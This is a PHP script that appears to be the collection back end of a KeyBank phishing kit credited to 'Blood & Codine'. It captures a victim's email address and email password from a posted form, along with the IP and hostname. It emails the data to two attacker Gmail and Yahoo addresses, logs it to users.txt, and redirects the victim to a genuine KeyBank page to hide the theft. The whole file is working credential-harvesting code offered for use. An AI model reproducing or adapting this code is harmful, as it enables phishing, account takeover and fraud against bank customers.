<?php
$ip = getenv("REMOTE_ADDR");
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$hostname = gethostbyaddr($ip);


$message  = "=+=+=+=+=+=+[Email info - KeyBank Result]+=+=+=+=+=+=+=\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Email Password: ".$_POST['emailpass']."\n";
$message .= "IP: ".$ip."\n";

$message .= "=+=+=+=+=+=+=+[ Ip & Hostname Info ]+=+=+=+=+=+=+\n";
$message .= "Client IP : ".$ip."\n";$message .= "HostName : ".$hostname."\n";
$message .= "=+=+=+=+=+=+=+ [  Blood & Codine  ]+=+=+=+=+=+=+=+\n";



$recipient = "homead01@gmail.com, homead01@yahoo.com";
$subject = "KeyBank INFO 2 BY Blood & Codine $ip";
$headers = "From: Admin<admin@tsoft.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Version: 2.1\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   
		   $fp = fopen("users.txt","a");
fputs($fp,$message);
fclose($fp);
		   
		   
		   
		   
		   header("Location: https://www.key.com/personal/calculators/debt-consolidation-calculator.jsp");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>